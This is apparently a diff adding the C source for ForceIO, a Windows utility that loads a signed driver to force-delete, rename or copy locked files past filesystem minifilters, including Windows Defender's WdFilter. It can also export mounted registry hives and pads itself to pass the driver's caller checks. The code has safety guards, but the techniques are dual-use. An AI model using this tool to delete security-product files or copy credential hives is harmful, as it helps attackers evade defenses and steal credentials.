+    const wchar_t* p = s;
+    while (*p) p++;
+    return (int)(p - s);
+}
+
+static void wcat(wchar_t* dst, const wchar_t* src, int max) {
+    int base = wlen(dst);
+    if (base + wlen(src) >= max) {
+        Con_Error(L"[!] Path is too long; refusing to truncate it.\r\n");
+        ExitProcess(ERROR_FILENAME_EXCED_RANGE);
+    }
+    int i = 0;
+    while (base + i < max - 1 && src[i]) { dst[base + i] = src[i]; i++; }
+    dst[base + i] = 0;
+}
+
+static void wcat_ch(wchar_t* dst, wchar_t ch, int max) {
+    int base = wlen(dst);
+    if (base >= max - 1) {
+        Con_Error(L"[!] Path is too long; refusing to truncate it.\r\n");
+        ExitProcess(ERROR_FILENAME_EXCED_RANGE);
+    }
+    if (base < max - 1) { dst[base] = ch; dst[base + 1] = 0; }
+}
+
+static int weq(const wchar_t* a, const wchar_t* b) {
+    while (*a && *b) {
+        wchar_t ca = *a, cb = *b;
+        if (ca >= L'A' && ca <= L'Z') ca += 32;
+        if (cb >= L'A' && cb <= L'Z') cb += 32;
+        if (ca != cb) return 0;
+        a++; b++;
+    }
+    return *a == *b;
+}
+
+static int is_abs_path_start(const wchar_t* s) {
+    if (!s) return 0;
+    if (s[0] == L'\\' && s[1] == L'\\') return 1;
+    if (((s[0] >= L'A' && s[0] <= L'Z') || (s[0] >= L'a' && s[0] <= L'z')) && s[1] == L':')
+        return 1;
+    return 0;
+}
+
+static int has_wildcard(const wchar_t* s) {
+    if (!s) return 0;
+    while (*s) {
+        if (*s == L'*' || *s == L'?') return 1;
+        s++;
+    }
+    return 0;
+}
+
+static int split_wildcard_path(const wchar_t* path, wchar_t* dir, int dir_max, const wchar_t** pattern) {
+    const wchar_t* last_bs = NULL;
+    for (const wchar_t* p = path; *p; p++) {
+        if (*p == L'\\') last_bs = p;
+    }
+    if (!last_bs) return 0;
+
+    for (const wchar_t* p = path; p < last_bs; p++) {
+        if (*p == L'*' || *p == L'?') return 0;
+    }
+
+    *pattern = last_bs + 1;
+    if (!**pattern) return 0;
+
+    int dir_len = (int)(last_bs - path);
+    if (dir_len == 2 && path[1] == L':') dir_len = 3;
+
+    if (dir_len >= dir_max) return 0;
+    for (int i = 0; i < dir_len; i++) dir[i] = path[i];
+    dir[dir_len] = 0;
+    return 1;
+}
+
+static void PrintUsage(void) {
+    Con_Print(L"ForceIO - minifilter-bypass file operations via signed driver\r\n");
+    Con_Print(L"WESMAR - Marek Wesolowski https://kvc.pl\r\n\r\n");
+    Con_Print(L"Usage: ForceIO <command> <path> [dest]\r\n\r\n");
+    Con_Print(L"Commands:\r\n");
+    Con_Print(L"  list    <path>       List visible directory entries (diagnostic)\r\n");
+    Con_Print(L"  locks   <path>       Show which processes lock the file\r\n");
+    Con_Print(L"  delete  <path>       Force-delete file (bypasses WdFilter)\r\n");
+    Con_Print(L"  rename  <src> <dst>  Force-rename/move file\r\n");
+    Con_Print(L"  copy    <src> <dst>  Copy locked file\r\n");
+    Con_Print(L"  start                Load driver only\r\n");
+    Con_Print(L"  stop                 Stop driver\r\n");
+    Con_Print(L"  cleanup              Stop driver, remove service, delete temp files\r\n");
+}
+
+// Print processes locking a file (IOCTL 0x222128 result).
+// buf: "exe_path,PID|exe_path,PID|..." WCHAR string, nChars wide chars.
+static DWORD PrintLockList(wchar_t* buf, DWORD nChars) {
+    if (nChars == 0) {
+        Con_Print(L"[+] No processes currently lock this file.\r\n");
+        return ERROR_SUCCESS;
+    }
+
+    DWORD count = 0;
+    wchar_t* entry = buf;
+    wchar_t* end   = buf + nChars;
+
+    while (entry < end && *entry) {
+        // find end of this entry (next '|' or end of buffer)
+        wchar_t* pipe = entry;
+        while (pipe < end && *pipe && *pipe != L'|') pipe++;
+        if (pipe == end) {
+            Con_Error(L"[-] Incomplete lock-list entry; missing terminator.\r\n");
+            return ERROR_INVALID_DATA;
+        }
+
+        // find the last ',' to split path from PID
+        // start one before pipe to avoid reading past valid data
+        wchar_t* comma = (pipe > entry) ? pipe - 1 : entry;
+        while (comma > entry && *comma != L',') comma--;
+
+        // print: "  PID  exe_name  (full_path)"
+        Con_Print(L"  PID ");
+        if (comma > entry) {
+            // PID: null-terminate at pipe so Con_Print stops there
+            wchar_t savedPipe = *pipe;
+            *pipe = 0;
+            Con_Print(comma + 1);
+            *pipe = savedPipe;
+
+            // find exe basename (last '\' before comma)
+            wchar_t* bs = comma;
+            while (bs > entry && *bs != L'\\') bs--;
+            if (*bs == L'\\') bs++;
+
+            // basename + full path both end at comma — one null-termination covers both
+            wchar_t savedComma = *comma;
+            *comma = 0;
+            Con_Print(L"  ");
+            Con_Print(bs);        // basename: bs..comma
+            Con_Print(L"  (");
+            Con_Print(entry);     // full path: entry..comma
+            Con_Print(L")");
+            *comma = savedComma;
+        } else {
+            // no comma — print raw entry, null-terminate at pipe
+            wchar_t savedPipe = *pipe;
+            *pipe = 0;
+            Con_Print(entry);
+            *pipe = savedPipe;
+        }
+        Con_Print(L"\r\n");
+        count++;
+
+        entry = pipe;
+        if (entry < end && *entry == L'|') entry++;
+    }
+
+    Con_Print(L"[*] "); Con_Dec(count); Con_Print(L" process(es) locking the file.\r\n");
+    return ERROR_SUCCESS;
+}
+
+#define MAX_ARGS 16
+static wchar_t g_cmdline[4096];
+static wchar_t* g_argv[MAX_ARGS];
+
+static int ParseCommandLine(void) {
+    const wchar_t* raw = GetCommandLineW();
+    int i = 0;
+    while (raw[i] && i < 4095) { g_cmdline[i] = raw[i]; i++; }
+    if (raw[i]) {
+        Con_Error(L"[!] Command line is too long.\r\n");
+        ExitProcess(ERROR_FILENAME_EXCED_RANGE);
+    }
+    g_cmdline[i] = 0;
+
+    int argc = 0;
+    wchar_t* p = g_cmdline;
+
+    while (*p && argc < MAX_ARGS) {
+        while (*p == L' ' || *p == L'\t') p++;
+        if (!*p) break;
+
+        if (*p == L'"') {
+            p++;
+            g_argv[argc++] = p;
+            while (*p && *p != L'"') p++;
+            if (*p) *p++ = 0;
+        } else {
+            g_argv[argc++] = p;
+            while (*p && *p != L' ' && *p != L'\t') p++;
+            if (*p) *p++ = 0;
+        }
+    }
+    while (*p == L' ' || *p == L'\t') p++;
+    if (*p) {
+        Con_Error(L"[!] Too many arguments.\r\n");
+        ExitProcess(ERROR_BAD_ARGUMENTS);
+    }
+    return argc;
+}
+
+static void ListVisibleEntries(const wchar_t* dir) {
+    wchar_t pattern[MAX_PATH * 2];
+    pattern[0] = 0;
+    wcat(pattern, dir, MAX_PATH * 2);
+    int len = wlen(pattern);
+    if (len > 0 && len < (MAX_PATH * 2) - 2 && pattern[len - 1] != L'\\') {
+        pattern[len] = L'\\';
+        pattern[len + 1] = 0;
+    }
+    wcat(pattern, L"*", MAX_PATH * 2);
+
+    WIN32_FIND_DATAW fd;
+    HANDLE hFind = FindFirstFileW(pattern, &fd);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        DWORD err = GetLastError();
+        Con_Error(L"[-] List failed, error=");
+        Con_Dec(err);
+        Con_Error(L" (");
+        Con_Hex32(err);
+        Con_Error(L")\r\n");
+        ExitProcess(err);
+    }
+
+    DWORD count = 0;
+    do {
+        if (fd.cFileName[0] == L'.' &&
+            (fd.cFileName[1] == 0 || (fd.cFileName[1] == L'.' && fd.cFileName[2] == 0)))
+            continue;
+
+        count++;
+        Con_Print((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? L"[D] " : L"[F] ");
+        Con_Print(fd.cFileName);
+        Con_Print(L" attr=");
+        Con_Hex32(fd.dwFileAttributes);
+        Con_Print(L"\r\n");
+    } while (FindNextFileW(hFind, &fd));
+
+    DWORD last = GetLastError();
+    FindClose(hFind);
+    if (last != ERROR_NO_MORE_FILES) {
+        Con_Error(L"[-] Enumeration stopped, error=");
+        Con_Dec(last);
+        Con_Error(L" (");
+        Con_Hex32(last);
+        Con_Error(L")\r\n");
+        ExitProcess(last);
+    }
+
+    Con_Print(L"[*] Visible entries: ");
+    Con_Dec(count);
+    Con_Print(L"\r\n");
+}
+
+void __stdcall Entry(void) {
+    Con_Init();
+
+    // Disable WOW64 file system redirection on 64-bit systems so 32-bit ForceIO
+    // can access real System32 paths (e.g. System32\winevt\Logs) without redirection to SysWOW64.
+    PVOID oldWow64 = NULL;
+    HMODULE hK32 = GetModuleHandleW(L"kernel32.dll");
+    if (hK32) {
+        typedef BOOL (WINAPI *pfnWow64Disable)(PVOID*);
+        pfnWow64Disable fnDisable = (pfnWow64Disable)GetProcAddress(hK32, "Wow64DisableWow64FsRedirection");
+        if (fnDisable) fnDisable(&oldWow64);
+    }
+
+    int argc = ParseCommandLine();
+    wchar_t** argv = g_argv;
+
+    if (argc < 2) {
+        PrintUsage();
+        ExitProcess(1);
+    }
+
+    const wchar_t* cmd = argv[1];
+
+    // Ensure binary satisfies driver caller checksums (via in-flight mathematical stager if unpadded)
+    if (!weq(cmd, L"list") && !weq(cmd, L"ls")) {
+        DWORD stagedExitCode = 0;
+        if (Stager_EnsurePadded(&stagedExitCode)) {
+            ExitProcess(stagedExitCode);
+        }
+    }
+
+    // ── Driver-only commands (no path required) ─────────────────────────
+    if (weq(cmd, L"start")) {
+        Con_Print(L"[*] Loading driver...\r\n");
+        if (DriverSession_Start()) {
+            Con_Print(L"[+] Driver running.\r\n");
+            ExitProcess(0);
+        }
+        Con_Error(L"[!] Failed to start driver.\r\n");
+        ExitProcess(1);
+    }
+
+    if (weq(cmd, L"stop")) {
+        DriverSession_Stop();
+        Con_Print(L"[*] Driver stop requested.\r\n");
+        ExitProcess(0);
+    }
+
+    if (weq(cmd, L"cleanup")) {
+        DriverSession_Cleanup();
+        Con_Print(L"[*] Cleanup complete.\r\n");
+        ExitProcess(0);
+    }
+
+    // ── File operation commands (path required) ─────────────────────────
+    if (argc < 3) {
+        PrintUsage();
+        ExitProcess(1);
+    }
+
+    if (weq(cmd, L"locks") || weq(cmd, L"unlock")) {
+        static wchar_t lockPath[MAX_PATH * 2];
+        static wchar_t resolvedLock[FORCEIO_PATH_CAPACITY];
+        lockPath[0] = 0;
+        for (int i = 2; i < argc; i++) {
+            if (i > 2) wcat_ch(lockPath, L' ', MAX_PATH * 2);
+            wcat(lockPath, argv[i], MAX_PATH * 2);
+        }
+        int lpl = wlen(lockPath);
+        if (lpl > 3 && lockPath[lpl - 1] == L'\\') lockPath[lpl - 1] = 0;
+
+        DWORD rerr = PathSafety_Resolve(lockPath, resolvedLock);
+        const wchar_t* targetLock = (rerr == ERROR_SUCCESS) ? resolvedLock : lockPath;
+
+        if (has_wildcard(targetLock)) {
+            static wchar_t wildcard_dir[MAX_PATH * 2];
+            const wchar_t* pattern = NULL;
+            if (!split_wildcard_path(targetLock, wildcard_dir, MAX_PATH * 2, &pattern)) {
+                Con_Error(L"[!] Unsafe or unsupported wildcard path.\r\n");
+                ExitProcess(ERROR_INVALID_NAME);
+            }
+            DWORD safetyError = PathSafety_Check(wildcard_dir);
+            if (safetyError) {
+                Con_Error(L"[!] Unsafe directory, error=");
+                Con_Dec(safetyError);
+                Con_Error(L"\r\n");
+                ExitProcess(safetyError);
+            }
+
+            HANDLE hDev = DriverSession_Begin();
+            if (hDev == INVALID_HANDLE_VALUE) {
+                DWORD dle = GetLastError();
+                Con_Error(L"[!] Cannot start driver session (error=");
+                Con_Dec(dle);
+                Con_Error(L"). Run as Administrator.\r\n");
+                ExitProcess(1);
+            }
+
+            WIN32_FIND_DATAW fd;
+            HANDLE hFind = FindFirstFileW(targetLock, &fd);
+            if (hFind == INVALID_HANDLE_VALUE) {
+                DWORD err = GetLastError();
+                DriverSession_End(hDev);
+                Con_Error(L"[-] No matching files found, error=");
+                Con_Dec(err);
+                Con_Error(L"\r\n");
+                ExitProcess(err);
+            }
+
+            static wchar_t child_path[MAX_PATH * 2];
+            do {
+                if (fd.cFileName[0] == L'.' &&
+                    (fd.cFileName[1] == 0 || (fd.cFileName[1] == L'.' && fd.cFileName[2] == 0)))
+                    continue;
+                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+                    continue;
+
+                child_path[0] = 0;
+                wcat(child_path, wildcard_dir, MAX_PATH * 2);
+                int dlen = wlen(child_path);
+                if (dlen > 0 && child_path[dlen - 1] != L'\\') {
+                    wcat_ch(child_path, L'\\', MAX_PATH * 2);
+                }
+                wcat(child_path, fd.cFileName, MAX_PATH * 2);
+
+                Con_Print(L"[*] LOCKS: ");
+                Con_Print(child_path);
+                Con_Print(L"\r\n");
+
+                wchar_t* lockBuf = NULL;
+                DWORD lockChars = 0;
+                DWORD lerr = DeviceIO_QueryLocks(hDev, child_path, &lockBuf, &lockChars);
+                if (lerr == 0) {
+                    PrintLockList(lockBuf, lockChars);
+                } else {
+                    Con_Error(L"[-] Query failed, error=");
+                    Con_Dec(lerr);
+                    Con_Error(L"\r\n");
+                }
+                if (lockBuf) VirtualFree(lockBuf, 0, MEM_RELEASE);
+            } while (FindNextFileW(hFind, &fd));
+
+            FindClose(hFind);
+            DriverSession_End(hDev);
+            ExitProcess(0);
+        }
+
+        Con_Print(L"[*] LOCKS: ");
+        Con_Print(targetLock);
+        Con_Print(L"\r\n");
+
+        HANDLE hDev = DriverSession_Begin();
+        if (hDev == INVALID_HANDLE_VALUE) {
+            DWORD dle = GetLastError();
+            Con_Error(L"[!] Cannot start driver session (error=");
+            Con_Dec(dle);
+            Con_Error(L"). Run as Administrator.\r\n");
+            ExitProcess(1);
+        }
+
+        wchar_t* lockBuf   = NULL;
+        DWORD    lockChars = 0;
+        DWORD    lerr = DeviceIO_QueryLocks(hDev, targetLock, &lockBuf, &lockChars);
+        DriverSession_End(hDev);
+
+        if (lerr != 0) {
+            Con_Error(L"[-] Query failed, error=");
+            Con_Dec(lerr);
+            Con_Error(L" (");
+            Con_Hex32(lerr);
+            Con_Error(L")\r\n");
+            ExitProcess(lerr);
+        }
+
+        lerr = PrintLockList(lockBuf, lockChars);
+        if (lockBuf) VirtualFree(lockBuf, 0, MEM_RELEASE);
+        ExitProcess(lerr);
+    }
+
+    // Determine operation
+    DWORD op = 0;
+    const wchar_t* verb = NULL;
+
+    if (weq(cmd, L"list") || weq(cmd, L"ls")) {
+        op = 4; verb = L"LIST";
+    } else if (weq(cmd, L"delete") || weq(cmd, L"del")) {
+        op = 1; verb = L"DELETE";
+    } else if (weq(cmd, L"rename") || weq(cmd, L"ren") || weq(cmd, L"move")) {
+        op = 2; verb = L"RENAME";
+    } else if (weq(cmd, L"copy") || weq(cmd, L"cp")) {
+        op = 3; verb = L"COPY";
+    } else {
+        Con_Error(L"[!] Unknown command: ");
+        Con_Error(cmd);
+        Con_Error(L"\r\n");
+        ExitProcess(1);
+    }
+
+    // Reassemble path from argv fragments (handles unquoted paths with spaces).
+    // For rename/copy: last argument is dest, everything before is source path.
+    // For delete: all arguments after command form the path.
+    static wchar_t path[MAX_PATH * 2];
+    static wchar_t dest_buf[MAX_PATH * 2];
+    static wchar_t resolved_path[FORCEIO_PATH_CAPACITY];
+    static wchar_t resolved_dest[FORCEIO_PATH_CAPACITY];
+    wchar_t* dest = NULL;
+    path[0] = 0;
+    dest_buf[0] = 0;
+
+    int path_end = argc;       // exclusive: argv[2..path_end-1] = source path
+    if ((op == 2 || op == 3) && argc > 3) {
+        path_end = argc - 1;   // quoted path case: last arg is dest
+        for (int i = 3; i < argc; i++) {
+            if (is_abs_path_start(argv[i])) {
+                path_end = i;  // unquoted case: second absolute path starts dest
+                break;
+            }
+        }
+    }
+
+    for (int i = 2; i < path_end; i++) {
+        if (i > 2) wcat_ch(path, L' ', MAX_PATH * 2);
+        wcat(path, argv[i], MAX_PATH * 2);
+    }
+
+    if (op == 2 || op == 3) {
+        if (path_end >= argc) {
+            Con_Error(L"[!] Rename/copy requires destination path.\r\n");
+            ExitProcess(1);
+        }
+        for (int i = path_end; i < argc; i++) {
+            if (i > path_end) wcat_ch(dest_buf, L' ', MAX_PATH * 2);
+            wcat(dest_buf, argv[i], MAX_PATH * 2);
+        }
+        dest = dest_buf;
+    }
+
+    // Strip trailing backslash (unless root like C:\)
+    {
+        int pl = wlen(path);
+        if (pl > 3 && path[pl - 1] == L'\\') path[pl - 1] = 0;
+        if (dest) {
+            int dl = wlen(dest);
+            if (dl > 3 && dest[dl - 1] == L'\\') dest[dl - 1] = 0;
+        }
+    }
+
+    // Canonicalize paths to absolute so relative paths work from any working directory
+    // and kernel driver receives fully qualified NT paths (\??\C:\...).
+    {
+        DWORD resErr = PathSafety_Resolve(path, resolved_path);
+        if (resErr == ERROR_SUCCESS) {
+            path[0] = 0;
+            wcat(path, resolved_path, MAX_PATH * 2);
+        }
+        if (dest) {
+            DWORD destErr = PathSafety_Resolve(dest, resolved_dest);
+            if (destErr == ERROR_SUCCESS) {
+                dest_buf[0] = 0;
+                wcat(dest_buf, resolved_dest, MAX_PATH * 2);
+                dest = dest_buf;
+            }
+        }
+    }
+
+    // Wildcard batch support (for delete)
+    if (has_wildcard(path)) {
+        if (op != 1) {
+            Con_Error(L"[!] Wildcards are only supported for 'delete' and 'locks'.\r\n");
+            ExitProcess(ERROR_NOT_SUPPORTED);
+        }
+
+        static wchar_t wildcard_dir[MAX_PATH * 2];
+        const wchar_t* pattern = NULL;
+        if (!split_wildcard_path(path, wildcard_dir, MAX_PATH * 2, &pattern)) {
+            Con_Error(L"[!] Unsafe or unsupported wildcard path.\r\n");
+            ExitProcess(ERROR_INVALID_NAME);
+        }
+
+        DWORD safetyError = PathSafety_Check(wildcard_dir);
+        if (safetyError) {
+            Con_Error(L"[!] Unsafe directory, error=");
+            Con_Dec(safetyError);
+            Con_Error(L"\r\n");
+            ExitProcess(safetyError);
+        }
+
+        // Safety: refuse to delete wildcard in critical system roots
+        static const wchar_t* blocked_roots[] = {
+            L"c:\\", L"c:\\windows", L"c:\\program files", L"c:\\program files (x86)",
+            L"c:\\users", L"c:\\system volume information", NULL
+        };
+        for (int b = 0; blocked_roots[b]; b++) {
+            if (weq(wildcard_dir, blocked_roots[b])) {
+                Con_Error(L"[!] Refusing wildcard delete in critical system path: ");
+                Con_Error(wildcard_dir);
+                Con_Error(L"\r\n");
+                ExitProcess(1);
+            }
+        }
+
+        HANDLE hDev = DriverSession_Begin();
+        if (hDev == INVALID_HANDLE_VALUE) {
+            DWORD dle = GetLastError();
+            Con_Error(L"[!] Cannot start driver session (error=");
+            Con_Dec(dle);
+            Con_Error(L"). Run as Administrator.\r\n");
+            ExitProcess(1);
+        }
+
+        WIN32_FIND_DATAW fd;
+        HANDLE hFind = FindFirstFileW(path, &fd);
+        if (hFind == INVALID_HANDLE_VALUE) {
+            DWORD err = GetLastError();
+            DriverSession_End(hDev);
+            Con_Error(L"[-] No matching files found, error=");
+            Con_Dec(err);
+            Con_Error(L" (");
+            Con_Hex32(err);
+            Con_Error(L")\r\n");
+            ExitProcess(err);
+        }
+
+        DWORD total = 0, success = 0, failed = 0;
+        static wchar_t child_path[MAX_PATH * 2];
+        do {
+            if (fd.cFileName[0] == L'.' &&
+                (fd.cFileName[1] == 0 || (fd.cFileName[1] == L'.' && fd.cFileName[2] == 0)))
+                continue;
+            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+                continue;
+
+            child_path[0] = 0;
+            wcat(child_path, wildcard_dir, MAX_PATH * 2);
+            int dlen = wlen(child_path);
+            if (dlen > 0 && child_path[dlen - 1] != L'\\') {
+                wcat_ch(child_path, L'\\', MAX_PATH * 2);
+            }
+            wcat(child_path, fd.cFileName, MAX_PATH * 2);
+
+            total++;
+            Con_Print(L"[*] DELETE: ");
+            Con_Print(child_path);
+            Con_Print(L"\r\n");
+
+            DWORD err = DeviceIO_Delete(hDev, child_path);
+            if (err == 0) {
+                Con_Print(L"[+] Success.\r\n");
+                success++;
+            } else {
+                Con_Error(L"[-] Failed, error=");
+                Con_Dec(err);
+                Con_Error(L" (");
+                Con_Hex32(err);
+                Con_Error(L")\r\n");
+                failed++;
+            }
+        } while (FindNextFileW(hFind, &fd));
+
+        FindClose(hFind);
+        DriverSession_End(hDev);
+
+        Con_Print(L"[*] Summary: ");
+        Con_Dec(success);
+        Con_Print(L" deleted, ");
+        Con_Dec(failed);
+        Con_Print(L" failed (total ");
+        Con_Dec(total);
+        Con_Print(L")\r\n");
+
+        ExitProcess(failed ? 1 : 0);
+    }
+
+    // Reject unsafe paths before accessing registry hives or starting a session.
+    if (op != 4) {
+        DWORD safetyError = dest ? PathSafety_CheckPair(path, dest) : PathSafety_Check(path);
+        if (safetyError) {
+            Con_Error(L"[!] Unsafe or unsupported path, error=");
+            Con_Dec(safetyError);
+            Con_Error(L"\r\n");
+            ExitProcess(safetyError);
+        }
+    }
+
+    // Safety: refuse to delete critical system paths
+    if (op == 1) {
+        static const wchar_t* blocked[] = {
+            L"c:\\windows", L"c:\\program files", L"c:\\program files (x86)",
+            L"c:\\users", L"c:\\programdata", L"c:\\system volume information",
+            L"c:\\$recycle.bin", L"c:\\", L"d:\\", L"e:\\",
+            NULL
+        };
+        for (int b = 0; blocked[b]; b++) {
+            if (weq(path, blocked[b])) {
+                Con_Error(L"[!] Refusing to delete critical path: ");
+                Con_Error(path);
+                Con_Error(L"\r\n");
+                ExitProcess(1);
+            }
+        }
+    }
+
+    if (op == 4) {
+        Con_Print(L"[*] LIST: ");
+        Con_Print(path);
+        Con_Print(L"\r\n");
+        ListVisibleEntries(path);
+        ExitProcess(0);
+    }
+
+    // Registry hive files are locked by the kernel registry manager, not WdFilter.
+    // The IOCTL path returns ERROR_SHARING_VIOLATION for them regardless of driver state.
+    // Intercept here and route copy -> RegSaveKeyExW; block delete/rename with a clear message.
+    {
+        wchar_t hiveSubKey[512];
+        HKEY    hiveRoot = NULL;
+        if (HiveIO_IsHivePath(path, &hiveRoot, hiveSubKey, 512)) {
+            if (op == 1 || op == 2) {
+                Con_Error(L"[!] Path is a mounted registry hive.\r\n");
+                Con_Error(L"    Delete/rename not supported while the hive is loaded.\r\n");
+                Con_Error(L"    Use 'copy' to export a consistent snapshot via RegSaveKeyExW.\r\n");
+                ExitProcess(ERROR_SHARING_VIOLATION);
+            }
+            // op == 3 (copy)
+            if (!dest) {
+                Con_Error(L"[!] Copy requires a destination path.\r\n");
+                ExitProcess(1);
+            }
+            Con_Print(L"[*] Registry hive detected -> RegSaveKeyExW path (no driver needed)\r\n");
+            Con_Print(L"[*] COPY (hive): ");
+            Con_Print(path);
+            Con_Print(L" -> ");
+            Con_Print(dest);
+            Con_Print(L"\r\n");
+
+            BOOL overwriteConfirmed = FALSE;
+            DWORD destinationAttributes = GetFileAttributesW(dest);
+            if (destinationAttributes != INVALID_FILE_ATTRIBUTES) {
+                if (destinationAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                    Con_Error(L"[!] Destination is a directory.\r\n");
+                    ExitProcess(ERROR_ALREADY_EXISTS);
+                }
+                if (!Con_ConfirmOverwrite(dest)) {
+                    Con_Error(L"\r\nOperation cancelled.\r\n");
+                    ExitProcess(ERROR_CANCELLED);
+                }
+                overwriteConfirmed = TRUE;
+            }
+            DWORD herr = HiveIO_Save(hiveRoot, hiveSubKey, dest, overwriteConfirmed);
+            if (herr == 0) {
+                Con_Print(L"[+] Success.\r\n");
+                ExitProcess(0);
+            }
+            Con_Error(L"[-] Failed, error=");
+            Con_Dec(herr);
+            Con_Error(L" (");
+            Con_Hex32(herr);
+            Con_Error(L")\r\n");
+            ExitProcess(herr);
+        }
+    }
+
+    // Atomic driver session: extract → service → start → device
+    HANDLE hDev = DriverSession_Begin();
+    if (hDev == INVALID_HANDLE_VALUE) {
+        DWORD dle = GetLastError();
+        Con_Error(L"[!] Cannot start driver session (error=");
+        Con_Dec(dle);
+        Con_Error(L"). Run as Administrator.\r\n");
+        ExitProcess(1);
+    }
+
+    // Execute
+    Con_Print(L"[*] ");
+    Con_Print(verb);
+    Con_Print(L": ");
+    Con_Print(path);
+    if (dest) { Con_Print(L" -> "); Con_Print(dest); }
+    Con_Print(L"\r\n");
+
+    DWORD err = 0;
+    switch (op) {
+        case 1: err = DeviceIO_Delete(hDev, path); break;
+        case 2: err = DeviceIO_Rename(hDev, path, dest); break;
+        case 3: err = DeviceIO_Copy(hDev, path, dest); break;
+    }
+
+    // Atomic cleanup: close device → stop → delete service → remove driver
+    DriverSession_End(hDev);
+
+    if (err == 0) {
+        Con_Print(L"[+] Success.\r\n");
+        ExitProcess(0);
+    }
+
+    Con_Error(L"[-] Failed, error=");
+    Con_Dec(err);
+    Con_Error(L" (");
+    Con_Hex32(err);
+    Con_Error(L")\r\n");
+    ExitProcess(err);
+}
+
+```
